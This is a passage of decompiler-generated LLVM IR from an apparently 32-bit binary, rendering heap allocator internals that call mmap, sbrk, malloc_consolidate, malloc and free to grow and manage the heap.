  %v1_8050020 = add i32 %v0_8050020, 8
  %v2_8050020 = inttoptr i32 %v1_8050020 to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_8050020, align 4
  %v0_8050027 = load i32, i32* @edx, align 4
  %v1_8050027 = add i32 %v0_8050027, 12
  %v2_8050027 = inttoptr i32 %v1_8050027 to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_8050027, align 4
  br i1 %v6_804fda3, label %dec_label_pc_8050036, label %dec_label_pc_8050030

dec_label_pc_8050030:                             ; preds = %dec_label_pc_805000e
  %v0_8050030 = load i32, i32* @edx, align 4
  store i32 %v0_8050030, i32* @global_var_80604b0.227, align 16
  br label %dec_label_pc_8050036

dec_label_pc_8050036:                             ; preds = %dec_label_pc_805000e, %dec_label_pc_8050030
  %v4_8050036 = or i32 %v1_80500ea, 1
  %v0_805003b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050036, i32* %ebx.global-to-local, align 4
  %v1_8050041 = or i32 %v0_805003b, 1
  store i32 %v1_8050041, i32* %eax.global-to-local, align 4
  %v1_8050044 = load i32, i32* @ecx, align 4
  %v2_8050044 = add i32 %v1_8050044, 4
  %v3_8050044 = inttoptr i32 %v2_8050044 to i32*
  store i32 %v4_8050036, i32* %v3_8050044, align 4
  %v0_8050047 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050047 = load i32, i32* @edx, align 4
  %v3_8050047 = add i32 %v1_8050047, %v0_8050047
  %v4_8050047 = inttoptr i32 %v3_8050047 to i32*
  store i32 %v0_8050047, i32* %v4_8050047, align 4
  %v0_805004a = load i32, i32* %eax.global-to-local, align 4
  %v1_805004a = load i32, i32* @edx, align 4
  %v2_805004a = add i32 %v1_805004a, 4
  %v3_805004a = inttoptr i32 %v2_805004a to i32*
  store i32 %v0_805004a, i32* %v3_805004a, align 4
  br label %dec_label_pc_805004d

dec_label_pc_805004d:                             ; preds = %dec_label_pc_8050007, %dec_label_pc_8050036
  %v0_805004d = load i32, i32* @ecx, align 4
  %v1_805004d = add i32 %v0_805004d, 8
  store i32 %v1_805004d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805044f

dec_label_pc_8050055.loopexit:                    ; preds = %dec_label_pc_804ffa2
  br label %dec_label_pc_8050055

dec_label_pc_8050055:                             ; preds = %dec_label_pc_8050055.loopexit, %dec_label_pc_804fd5d, %dec_label_pc_804fd65
  %v0_8050055 = load i32, i32* @global_var_80604ac.226, align 4
  store i32 %v0_8050055, i32* @ebx, align 4
  %v1_805005f = add i32 %v1_80500ea, 16
  store i32 %v1_805005f, i32* @esi, align 4
  %v1_8050062 = add i32 %v0_8050055, 4
  %v2_8050062 = inttoptr i32 %v1_8050062 to i32*
  %v3_8050062 = load i32, i32* %v2_8050062, align 4
  %v1_8050069 = and i32 %v3_8050062, -4
  store i32 %v1_8050069, i32* %ecx.global-to-local, align 4
  %v7_805006c = icmp ult i32 %v1_8050069, %v1_805005f
  br i1 %v7_805006c, label %dec_label_pc_805008c, label %dec_label_pc_8050070

dec_label_pc_8050070:                             ; preds = %dec_label_pc_8050055
  %v2_8050074 = add i32 %v0_8050055, %v1_80500ea
  store i32 %v2_8050074, i32* @edx, align 4
  %v1_8050077 = or i32 %v1_80500ea, 1
  store i32 %v1_8050077, i32* %eax.global-to-local, align 4
  store i32 %v2_8050074, i32* @global_var_80604ac.226, align 4
  store i32 %v1_8050077, i32* %v2_8050062, align 4
  %v0_8050083 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8050083 = sub i32 %v0_8050083, %v1_80500ea
  store i32 %v5_8050083, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80503df

dec_label_pc_805008c:                             ; preds = %dec_label_pc_8050055
  %v0_805008c = load i32, i32* @global_var_80607dc.231, align 4
  store i32 %v0_805008c, i32* %edx.global-to-local, align 4
  %v0_8050092 = load i8, i8* @global_var_8060480.225, align 128
  %v1_8050092 = and i8 %v0_8050092, 2
  %v2_8050092 = icmp eq i8 %v1_8050092, 0
  br i1 %v2_8050092, label %dec_label_pc_80500c0, label %dec_label_pc_805009b

dec_label_pc_805009b:                             ; preds = %dec_label_pc_805008c
  store i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32* %stack_var_-92, align 4
  %v2_80500a3 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060480.225 to i32*))
  store i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32* @ebx, align 4
  %v1_80500ad = add i32 %v1_80500ea, -7
  store i32 %v1_80500ad, i32* %eax.global-to-local, align 4
  store i32 %v1_80500ad, i32* %stack_var_-92, align 4
  %v1_80500b1 = call i32 @malloc(i32 %v1_80500ad)
  store i32 %v1_80500b1, i32* %eax.global-to-local, align 4
  store i32 %v1_80500b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805044f

dec_label_pc_80500c0:                             ; preds = %dec_label_pc_805008c
  %v1_80500c0 = add i32 %v0_805008c, -1
  store i32 %v1_80500c0, i32* @ecx, align 4
  store i32 %v1_80500ea, i32* @ebx, align 4
  %v1_80500cb = load i32, i32* @global_var_80607cc.232, align 4
  %v7_80500cb = icmp ult i32 %v1_80500ea, %v1_80500cb
  br i1 %v7_80500cb, label %dec_label_pc_805018d, label %dec_label_pc_80500d7

dec_label_pc_80500d7:                             ; preds = %dec_label_pc_80500c0
  %v0_80500d7 = load i32, i32* @global_var_80607d0.233, align 16
  store i32 %v0_80500d7, i32* %eax.global-to-local, align 4
  %v1_80500dc = load i32, i32* @global_var_80607d4.234, align 4
  %v5_80500e2 = icmp slt i32 %v0_80500d7, %v1_80500dc
  br i1 %v5_80500e2, label %dec_label_pc_80500e8, label %dec_label_pc_805018d

dec_label_pc_80500e8:                             ; preds = %dec_label_pc_80500d7
  %v2_80500ea = add i32 %v1_80500ea, 10
  %v3_80500ea = add i32 %v2_80500ea, %v0_805008c
  %v1_80500ee = sub i32 0, %v0_805008c
  store i32 %v1_80500ee, i32* %eax.global-to-local, align 4
  %v2_80500f0 = and i32 %v3_80500ea, %v1_80500ee
  store i32 %v2_80500f0, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_80500f0, %v1_80500ea
  br i1 %tmp129, label %dec_label_pc_80500fc, label %dec_label_pc_805018d

dec_label_pc_80500fc:                             ; preds = %dec_label_pc_80500e8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050109 = call i32 @mmap(i32 0, i32 %v2_80500f0, i32 3, i32 34, i32 0, i32 0, i32 %v1_80500c0, i32 %v1_80500c0)
  store i32 %v8_8050109, i32* %eax.global-to-local, align 4
  store i32 %v8_8050109, i32* @edx, align 4
  %v10_8050113 = icmp eq i32 %v8_8050109, -1
  br i1 %v10_8050113, label %dec_label_pc_80500fc.dec_label_pc_805018d_crit_edge, label %dec_label_pc_8050118

dec_label_pc_80500fc.dec_label_pc_805018d_crit_edge: ; preds = %dec_label_pc_80500fc
  %v0_805018d.pre = load i32, i32* @global_var_80604ac.226, align 4
  br label %dec_label_pc_805018d

dec_label_pc_8050118:                             ; preds = %dec_label_pc_80500fc
  %v1_805011a = urem i32 %v8_8050109, 8
  %v2_805011a = icmp eq i32 %v1_805011a, 0
  store i32 %v1_805011a, i32* @ecx, align 4
  br i1 %v2_805011a, label %dec_label_pc_8050132, label %dec_label_pc_805011f

dec_label_pc_805011f:                             ; preds = %dec_label_pc_8050118
  %v0_8050124 = load i32, i32* @ebx, align 4
  %v2_8050126 = sub nsw i32 8, %v1_805011a
  store i32 %v2_8050126, i32* %eax.global-to-local, align 4
  %v2_8050128 = add i32 %v2_8050126, %v8_8050109
  store i32 %v2_8050128, i32* @edx, align 4
  %v2_805012a = sub i32 %v0_8050124, %v2_8050126
  store i32 %v2_805012a, i32* %esi.global-to-local, align 4
  %v2_805012c = inttoptr i32 %v2_8050128 to i32*
  store i32 %v2_8050126, i32* %v2_805012c, align 4
  br label %dec_label_pc_805013a

dec_label_pc_8050132:                             ; preds = %dec_label_pc_8050118
  %v1_8050132 = inttoptr i32 %v8_8050109 to i32*
  store i32 0, i32* %v1_8050132, align 4
  br label %dec_label_pc_805013a

dec_label_pc_805013a:                             ; preds = %dec_label_pc_805011f, %dec_label_pc_8050132
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805011f ], [ @ebx, %dec_label_pc_8050132 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805013a = or i32 %storemerge, 2
  %v1_805013d = load i32, i32* @edx, align 4
  %v2_805013d = add i32 %v1_805013d, 4
  %v3_805013d = inttoptr i32 %v2_805013d to i32*
  store i32 %v1_805013a, i32* %v3_805013d, align 4
  %v0_8050140 = load i32, i32* @global_var_80607d0.233, align 16
  %v1_8050145 = add i32 %v0_8050140, 1
  store i32 %v1_8050145, i32* %eax.global-to-local, align 4
  store i32 %v1_8050145, i32* @global_var_80607d0.233, align 16
  %v1_805014b = load i32, i32* @global_var_80607d8.235, align 8
  %v7_8050151 = icmp sgt i32 %v1_8050145, %v1_805014b
  br i1 %v7_8050151, label %dec_label_pc_8050153, label %dec_label_pc_8050158

dec_label_pc_8050153:                             ; preds = %dec_label_pc_805013a
  store i32 %v1_8050145, i32* @global_var_80607d8.235, align 8
  br label %dec_label_pc_8050158

dec_label_pc_8050158:                             ; preds = %dec_label_pc_805013a, %dec_label_pc_8050153
  %v0_8050158 = load i32, i32* @global_var_80607e4.236, align 4
  %v1_805015d = load i32, i32* @ebx, align 4
  %v2_805015d = add i32 %v1_805015d, %v0_8050158
  store i32 %v2_805015d, i32* %eax.global-to-local, align 4
  store i32 %v2_805015d, i32* @global_var_80607e4.236, align 4
  %v1_8050164 = load i32, i32* @global_var_80607f0.237, align 16
  %tmp130 = icmp ugt i32 %v2_805015d, %v1_8050164
  br i1 %tmp130, label %dec_label_pc_805016c, label %dec_label_pc_8050171

dec_label_pc_805016c:                             ; preds = %dec_label_pc_8050158
  store i32 %v2_805015d, i32* @global_var_80607f0.237, align 16
  br label %dec_label_pc_8050171

dec_label_pc_8050171:                             ; preds = %dec_label_pc_8050158, %dec_label_pc_805016c
  %v1_8050171 = load i32, i32* @global_var_80607e8.238, align 8
  %v2_8050171 = add i32 %v1_8050171, %v2_805015d
  store i32 %v2_8050171, i32* %eax.global-to-local, align 4
  %v1_8050177 = load i32, i32* @global_var_80607f4.239, align 4
  %tmp131 = icmp ugt i32 %v2_8050171, %v1_8050177
  br i1 %tmp131, label %dec_label_pc_8050183, label %dec_label_pc_804fdd4

dec_label_pc_8050183:                             ; preds = %dec_label_pc_8050171
  store i32 %v2_8050171, i32* @global_var_80607f4.239, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_805018d:                             ; preds = %dec_label_pc_80500e8, %dec_label_pc_80500fc.dec_label_pc_805018d_crit_edge, %dec_label_pc_80500d7, %dec_label_pc_80500c0
  %v0_805018d = phi i32 [ %v0_805018d.pre, %dec_label_pc_80500fc.dec_label_pc_805018d_crit_edge ], [ %v0_8050055, %dec_label_pc_80500d7 ], [ %v0_8050055, %dec_label_pc_80500e8 ], [ %v0_8050055, %dec_label_pc_80500c0 ]
  store i32 %v0_805018d, i32* %eax.global-to-local, align 4
  %v1_8050196 = add i32 %v0_805018d, 4
  %v2_8050196 = inttoptr i32 %v1_8050196 to i32*
  %v3_8050196 = load i32, i32* %v2_8050196, align 4
  %v1_80501a0 = and i32 %v3_8050196, -4
  %v2_80501a0 = icmp eq i32 %v1_80501a0, 0
  store i32 %v1_80501a0, i32* @ebp, align 4
  %v1_80501a3 = load i32, i32* @global_var_80607c8.240, align 8
  %v2_80501a3 = add i32 %v1_80501a3, %v1_805005f
  store i32 %v2_80501a3, i32* %eax.global-to-local, align 4
  %v0_80501a9 = load i8, i8* @global_var_80607e0.241, align 32
  %v1_80501a9 = urem i8 %v0_80501a9, 2
  %v2_80501a9 = icmp eq i8 %v1_80501a9, 0
  br i1 %v2_80501a9, label %dec_label_pc_80501b4, label %dec_label_pc_80501b2

dec_label_pc_80501b2:                             ; preds = %dec_label_pc_805018d
  %v2_80501b2 = sub i32 %v2_80501a3, %v1_80501a0
  store i32 %v2_80501b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80501b4

dec_label_pc_80501b4:                             ; preds = %dec_label_pc_805018d, %dec_label_pc_80501b2
  %v0_80501b8 = phi i32 [ %v2_80501a3, %dec_label_pc_805018d ], [ %v2_80501b2, %dec_label_pc_80501b2 ]
  %v5_80501b8 = add i32 %v0_80501b8, %v1_80500c0
  store i32 %v5_80501b8, i32* %eax.global-to-local, align 4
  %v1_80501bc = sub i32 0, %v0_805008c
  store i32 %v1_80501bc, i32* @edx, align 4
  %v2_80501c4 = and i32 %v5_80501b8, %v1_80501bc
  store i32 %v2_80501c4, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_80501c4, 1
  br i1 %tmp88, label %dec_label_pc_80501de, label %dec_label_pc_80501c8

dec_label_pc_80501c8:                             ; preds = %dec_label_pc_80501b4
  store i32 %v2_80501c4, i32* %stack_var_-92, align 4
  %v1_80501cc = call i32 @__GI_sbrk(i32 %v2_80501c4)
  store i32 %v1_80501cc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80501cc, i32* @ebx, align 4
  %v10_80501d9 = icmp eq i32 %v1_80501cc, -1
  %v1_80501dc = icmp eq i1 %v10_80501d9, false
  br i1 %v1_80501dc, label %dec_label_pc_8050234.dec_label_pc_805023d_crit_edge, label %dec_label_pc_80501c8.dec_label_pc_80501de_crit_edge

dec_label_pc_80501c8.dec_label_pc_80501de_crit_edge: ; preds = %dec_label_pc_80501c8
  %v0_80501de.pre = load i8, i8* @global_var_80607e0.241, align 32
  br label %dec_label_pc_80501de

dec_label_pc_80501de:                             ; preds = %dec_label_pc_80501c8.dec_label_pc_80501de_crit_edge, %dec_label_pc_80501b4
  %v0_805020a = phi i32 [ -1, %dec_label_pc_80501c8.dec_label_pc_80501de_crit_edge ], [ %v1_80501bc, %dec_label_pc_80501b4 ]
  %v0_80501de = phi i8 [ %v0_80501de.pre, %dec_label_pc_80501c8.dec_label_pc_80501de_crit_edge ], [ %v0_80501a9, %dec_label_pc_80501b4 ]
  %v1_80501de = urem i8 %v0_80501de, 2
  %v2_80501de = icmp eq i8 %v1_80501de, 0
  br i1 %v2_80501de, label %dec_label_pc_80501de.dec_label_pc_80501f3_crit_edge, label %dec_label_pc_80501e7

dec_label_pc_80501de.dec_label_pc_80501f3_crit_edge: ; preds = %dec_label_pc_80501de
  %v0_80501f3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80501f3

dec_label_pc_80501e7:                             ; preds = %dec_label_pc_80501de
  %v2_80501eb = add i32 %v1_80501a0, %v1_80500c0
  store i32 %v2_80501eb, i32* %eax.global-to-local, align 4
  %v0_80501ed = load i32, i32* @esi, align 4
  %v2_80501ed = add i32 %v0_80501ed, %v2_80501eb
  %v5_80501ef = and i32 %v2_80501ed, %v1_80501bc
  store i32 %v5_80501ef, i32* @esi, align 4
  br label %dec_label_pc_80501f3

dec_label_pc_80501f3:                             ; preds = %dec_label_pc_80501de.dec_label_pc_80501f3_crit_edge, %dec_label_pc_80501e7
  %v0_80501f3 = phi i32 [ %v0_80501f3.pre, %dec_label_pc_80501de.dec_label_pc_80501f3_crit_edge ], [ %v5_80501ef, %dec_label_pc_80501e7 ]
  %tmp132 = icmp ult i32 %v0_80501f3, 1048576
  br i1 %tmp132, label %dec_label_pc_80501fb, label %dec_label_pc_8050200

dec_label_pc_80501fb:                             ; preds = %dec_label_pc_80501f3
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8050200

dec_label_pc_8050200:                             ; preds = %dec_label_pc_80501f3, %dec_label_pc_80501fb
  %v0_8050214 = phi i32 [ %v0_80501f3, %dec_label_pc_80501f3 ], [ 1048576, %dec_label_pc_80501fb ]
  %tmp133 = icmp ugt i32 %v0_8050214, %v1_80500ea
  br i1 %tmp133, label %dec_label_pc_805020a, label %dec_label_pc_8050442

dec_label_pc_805020a:                             ; preds = %dec_label_pc_8050200
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050217 = call i32 @mmap(i32 0, i32 %v0_8050214, i32 3, i32 34, i32 0, i32 0, i32 %v0_805020a, i32 %v0_805020a)
  store i32 %v8_8050217, i32* %eax.global-to-local, align 4
  store i32 %v8_8050217, i32* @ebx, align 4
  %v10_8050221 = icmp eq i32 %v8_8050217, -1
  br i1 %v10_8050221, label %dec_label_pc_8050442, label %dec_label_pc_8050234.thread

dec_label_pc_8050234.thread:                      ; preds = %dec_label_pc_805020a
  %v0_805022a = load i8, i8* @global_var_80607e0.241, align 1
  %v2_805022a = and i8 %v0_805022a, -2
  store i8 %v2_805022a, i8* @global_var_80607e0.241, align 32
  %v1_8050231 = load i32, i32* @esi, align 4
  %v2_8050231 = add i32 %v1_8050231, %v8_8050217
  store i32 %v2_8050231, i32* @edx, align 4
  br label %dec_label_pc_805023d

dec_label_pc_8050234.dec_label_pc_805023d_crit_edge: ; preds = %dec_label_pc_80501c8
  %v1_8050241.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805023d

dec_label_pc_805023d:                             ; preds = %dec_label_pc_8050234.dec_label_pc_805023d_crit_edge, %dec_label_pc_8050234.thread
  %v1_8050241 = phi i32 [ %v1_8050231, %dec_label_pc_8050234.thread ], [ %v1_8050241.pre, %dec_label_pc_8050234.dec_label_pc_805023d_crit_edge ]
  %v0_805030992 = phi i32 [ %v8_8050217, %dec_label_pc_8050234.thread ], [ %v1_80501cc, %dec_label_pc_8050234.dec_label_pc_805023d_crit_edge ]
  %v0_80502fb91 = phi i32 [ %v2_8050231, %dec_label_pc_8050234.thread ], [ -1, %dec_label_pc_8050234.dec_label_pc_805023d_crit_edge ]
  %v0_8050241 = load i32, i32* @global_var_80607e8.238, align 8
  %v2_8050241 = add i32 %v1_8050241, %v0_8050241
  store i32 %v2_8050241, i32* @global_var_80607e8.238, align 8
  %v2_8050247 = add i32 %v1_80501a0, %v0_805018d
  store i32 %v2_8050247, i32* %ecx.global-to-local, align 4
  %v2_8050249 = sub i32 %v0_805030992, %v2_8050247
  %v7_8050249 = icmp ult i32 %v0_805030992, %v2_8050247
  %v12_8050249 = icmp eq i32 %v2_8050249, 0
  %v1_805024b = icmp eq i1 %v12_8050249, false
  br i1 %v1_805024b, label %dec_label_pc_8050264, label %dec_label_pc_805024d

dec_label_pc_805024d:                             ; preds = %dec_label_pc_805023d
  %v10_805024d = icmp eq i32 %v0_80502fb91, -1
  %v1_8050250 = icmp eq i1 %v10_805024d, false
  br i1 %v1_8050250, label %dec_label_pc_8050264, label %dec_label_pc_8050252

dec_label_pc_8050252:                             ; preds = %dec_label_pc_805024d
  %v2_8050252 = add i32 %v1_8050241, %v1_80501a0
  store i32 %v0_805018d, i32* %ecx.global-to-local, align 4
  %v1_8050259 = or i32 %v2_8050252, 1
  store i32 %v1_8050259, i32* %eax.global-to-local, align 4
  store i32 %v1_8050259, i32* %v2_8050196, align 4
  br label %dec_label_pc_8050391

dec_label_pc_8050264:                             ; preds = %dec_label_pc_805024d, %dec_label_pc_805023d
  %v0_8050264 = load i8, i8* @global_var_80607e0.241, align 1
  %v1_8050264 = sext i8 %v0_8050264 to i32
  store i32 %v1_8050264, i32* %eax.global-to-local, align 4
  %v2_8050269 = urem i8 %v0_8050264, 2
  %v3_8050269 = icmp eq i8 %v2_8050269, 0
  br i1 %v3_8050269, label %dec_label_pc_805027d, label %dec_label_pc_805026d

dec_label_pc_805026d:                             ; preds = %dec_label_pc_8050264
  br i1 %v2_80501a0, label %dec_label_pc_805027d, label %dec_label_pc_8050271

dec_label_pc_8050271:                             ; preds = %dec_label_pc_805026d
  %v1_8050273 = icmp eq i1 %v7_8050249, false
  br i1 %v1_8050273, label %dec_label_pc_805027d, label %dec_label_pc_8050275

dec_label_pc_8050275:                             ; preds = %dec_label_pc_8050271
  %v1_8050275 = and i32 %v1_8050264, -2
  %v4_8050275 = trunc i32 %v1_8050275 to i8
  store i32 %v1_8050275, i32* %eax.global-to-local, align 4
  store i8 %v4_8050275, i8* @global_var_80607e0.241, align 32
  br label %dec_label_pc_805027d

dec_label_pc_805027d:                             ; preds = %dec_label_pc_8050271, %dec_label_pc_805026d, %dec_label_pc_8050264, %dec_label_pc_8050275
  %v0_805027d = phi i8 [ %v0_8050264, %dec_label_pc_8050271 ], [ %v0_8050264, %dec_label_pc_805026d ], [ %v0_8050264, %dec_label_pc_8050264 ], [ %v4_8050275, %dec_label_pc_8050275 ]
  %v1_805027d = urem i8 %v0_805027d, 2
  %v2_805027d = icmp eq i8 %v1_805027d, 0
  br i1 %v2_805027d, label %dec_label_pc_80502fb, label %dec_label_pc_8050286

dec_label_pc_8050286:                             ; preds = %dec_label_pc_805027d
  br i1 %v2_80501a0, label %dec_label_pc_8050294, label %dec_label_pc_805028a

dec_label_pc_805028a:                             ; preds = %dec_label_pc_8050286
  store i32 %v2_8050249, i32* %eax.global-to-local, align 4
  %v2_805028e = add i32 %v2_8050241, %v2_8050249
  store i32 %v2_805028e, i32* @global_var_80607e8.238, align 8
  br label %dec_label_pc_8050294

dec_label_pc_8050294:                             ; preds = %dec_label_pc_8050286, %dec_label_pc_805028a
  %v1_8050296 = urem i32 %v0_805030992, 8
  %v2_8050296 = icmp eq i32 %v1_8050296, 0
  store i32 %v1_8050296, i32* %edx.global-to-local, align 4
  %v1_8050299 = icmp eq i1 %v2_8050296, false
  br i1 %v1_8050299, label %dec_label_pc_80502a1, label %dec_label_pc_805029b

dec_label_pc_805029b:                             ; preds = %dec_label_pc_8050294
  store i32 %v0_805030992, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80502ab

dec_label_pc_80502a1:                             ; preds = %dec_label_pc_8050294
  %v2_80502a6 = sub nsw i32 8, %v1_8050296
  store i32 %v2_80502a6, i32* %eax.global-to-local, align 4
  %v2_80502a8 = add i32 %v2_80502a6, %v0_805030992
  store i32 %v2_80502a8, i32* @edi, align 4
  br label %dec_label_pc_80502ab

dec_label_pc_80502ab:                             ; preds = %dec_label_pc_805029b, %dec_label_pc_80502a1
  %v0_80502ae = phi i32 [ 0, %dec_label_pc_805029b ], [ %v2_80502a6, %dec_label_pc_80502a1 ]
  %v2_80502ab = add i32 %v1_8050241, %v0_805030992
  %v2_80502ae = add i32 %v0_80502ae, %v1_80501a0
  store i32 %v2_80502ae, i32* %ecx.global-to-local, align 4
  %v2_80502b7 = add i32 %v2_80502ae, %v2_80502ab
  store i32 %v2_80502b7, i32* %edx.global-to-local, align 4
  %v2_80502bd = add i32 %v2_80502b7, %v1_80500c0
  %v5_80502c0 = and i32 %v2_80502bd, %v1_80501bc
  %v2_80502c7 = sub i32 %v5_80502c0, %v2_80502b7
  store i32 %v2_80502c7, i32* %eax.global-to-local, align 4
  %v2_80502c9 = add i32 %v2_80502c7, %v2_80502ae
  store i32 %v2_80502c9, i32* @esi, align 4
  store i32 %v2_80502c9, i32* %stack_var_-92, align 4
  %v1_80502cd = call i32 @__GI_sbrk(i32 %v2_80502c9)
  store i32 %v1_80502cd, i32* %eax.global-to-local, align 4
  store i32 %v1_80502cd, i32* @edx, align 4
  %v10_80502d7 = icmp eq i32 %v1_80502cd, -1
  %v1_80502da = icmp eq i1 %v10_80502d7, false
  br i1 %v1_80502da, label %dec_label_pc_80502ea, label %dec_label_pc_80502dc

dec_label_pc_80502dc:                             ; preds = %dec_label_pc_80502ab
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80502e1 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80502e1, i32* %eax.global-to-local, align 4
  store i32 %v1_80502e1, i32* @edx, align 4
  br label %dec_label_pc_805031e

dec_label_pc_80502ea:                             ; preds = %dec_label_pc_80502ab
  %v1_80502ea = load i32, i32* @ebx, align 4
  %v7_80502ea = icmp ult i32 %v1_80502cd, %v1_80502ea
  %v1_80502ec = icmp eq i1 %v7_80502ea, false
  br i1 %v1_80502ec, label %dec_label_pc_8050323, label %dec_label_pc_80502ee

dec_label_pc_80502ee:                             ; preds = %dec_label_pc_80502ea
  %v0_80502ee = load i8, i8* @global_var_80607e0.241, align 1
  %v2_80502ee = and i8 %v0_80502ee, -2
  store i8 %v2_80502ee, i8* @global_var_80607e0.241, align 32
  store i32 %v2_80502ab, i32* @edx, align 4
  br label %dec_label_pc_8050302

dec_label_pc_80502fb:                             ; preds = %dec_label_pc_805027d
  %v10_80502fb = icmp eq i32 %v0_80502fb91, -1
  br i1 %v10_80502fb, label %dec_label_pc_8050306, label %dec_label_pc_8050300

dec_label_pc_8050300:                             ; preds = %dec_label_pc_80502fb
  store i32 %v0_805030992, i32* @edi, align 4
  br label %dec_label_pc_8050302

dec_label_pc_8050302:                             ; preds = %dec_label_pc_80502ee, %dec_label_pc_8050300
  %v0_805032349 = phi i32 [ %v2_80502ab, %dec_label_pc_80502ee ], [ %v0_80502fb91, %dec_label_pc_8050300 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050323

dec_label_pc_8050306:                             ; preds = %dec_label_pc_80502fb
  store i32 %v0_805030992, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805030d = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805030d, i32* @edx, align 4
  %v1_8050314 = load i32, i32* @ebx, align 4
  %v2_8050314 = sub i32 %v1_805030d, %v1_8050314
  %v1_8050316 = load i32, i32* @esi, align 4
  %v2_8050316 = sub i32 %v2_8050314, %v1_8050316
  store i32 %v2_8050316, i32* %eax.global-to-local, align 4
  %v0_8050318 = load i32, i32* @global_var_80607e8.238, align 8
  %v2_8050318 = add i32 %v0_8050318, %v2_8050316
  store i32 %v2_8050318, i32* @global_var_80607e8.238, align 8
  br label %dec_label_pc_805031e

dec_label_pc_805031e:                             ; preds = %dec_label_pc_80502dc, %dec_label_pc_8050306
  %v0_805032348 = phi i32 [ %v1_80502e1, %dec_label_pc_80502dc ], [ %v1_805030d, %dec_label_pc_8050306 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050323

dec_label_pc_8050323:                             ; preds = %dec_label_pc_80502ea, %dec_label_pc_8050302, %dec_label_pc_805031e
  %v0_8050328 = phi i32 [ %v1_80502cd, %dec_label_pc_80502ea ], [ %v0_805032349, %dec_label_pc_8050302 ], [ %v0_805032348, %dec_label_pc_805031e ]
  %v10_8050323 = icmp eq i32 %v0_8050328, -1
  br i1 %v10_8050323, label %dec_label_pc_8050391, label %dec_label_pc_8050328

dec_label_pc_8050328:                             ; preds = %dec_label_pc_8050323
  %v1_8050328 = load i32, i32* @edi, align 4
  %v2_8050328 = sub i32 %v0_8050328, %v1_8050328
  store i32 %v2_8050328, i32* @edx, align 4
  store i32 %v1_8050328, i32* @global_var_80604ac.226, align 4
  %v1_8050330 = load i32, i32* @esi, align 4
  %v2_8050330 = add i32 %v1_8050330, %v2_8050328
  %v1_8050333 = or i32 %v2_8050330, 1
  store i32 %v1_8050333, i32* %eax.global-to-local, align 4
  %v2_8050336 = add i32 %v1_8050328, 4
  %v3_8050336 = inttoptr i32 %v2_8050336 to i32*
  store i32 %v1_8050333, i32* %v3_8050336, align 4
  %v0_8050339 = load i32, i32* @global_var_80607e8.238, align 8
  %v1_8050339 = load i32, i32* @esi, align 4
  %v2_8050339 = add i32 %v1_8050339, %v0_8050339
  store i32 %v2_8050339, i32* @global_var_80607e8.238, align 8
  br i1 %v2_80501a0, label %dec_label_pc_8050391, label %dec_label_pc_8050343

dec_label_pc_8050343:                             ; preds = %dec_label_pc_8050328
  %v1_8050343 = add i32 %v1_80501a0, -12
  store i32 %v0_805018d, i32* %ecx.global-to-local, align 4
  %v1_805034a = and i32 %v1_8050343, -8
  store i32 %v1_805034a, i32* %eax.global-to-local, align 4
  %v1_805034f = or i32 %v1_805034a, 1
  store i32 %v1_805034f, i32* @edx, align 4
  %v5_8050352 = icmp ult i32 %v1_805034a, 15
  store i32 %v1_805034f, i32* %v2_8050196, align 4
  %v0_8050358 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050358 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050358 = add i32 %v0_8050358, 4
  %v3_8050358 = add i32 %v2_8050358, %v1_8050358
  %v4_8050358 = inttoptr i32 %v3_8050358 to i32*
  store i32 5, i32* %v4_8050358, align 4
  %v0_8050360 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050360 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050360 = add i32 %v0_8050360, 8
  %v3_8050360 = add i32 %v2_8050360, %v1_8050360
  %v4_8050360 = inttoptr i32 %v3_8050360 to i32*
  store i32 5, i32* %v4_8050360, align 4
  br i1 %v5_8050352, label %dec_label_pc_8050391, label %dec_label_pc_805036a

dec_label_pc_805036a:                             ; preds = %dec_label_pc_8050343
  %v0_805036d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805036f = add i32 %v0_805036d, 8
  store i32 %v1_805036f, i32* %eax.global-to-local, align 4
  %v0_8050372 = load i32, i32* @global_var_80607c4.242, align 4
  store i32 %v0_8050372, i32* @ebx, align 4
  store i32 %v1_805036f, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_80607c4.242, align 4
  %v1_8050383 = call i32 @free(i32 %v1_805036f)
  store i32 %v1_8050383, i32* %eax.global-to-local, align 4
  %v0_8050388 = load i32, i32* @ebx, align 4
  store i32 %v0_8050388, i32* @global_var_80607c4.242, align 4
  br label %dec_label_pc_8050391

dec_label_pc_8050391:                             ; preds = %dec_label_pc_8050343, %dec_label_pc_8050328, %dec_label_pc_8050323, %dec_label_pc_8050252, %dec_label_pc_805036a
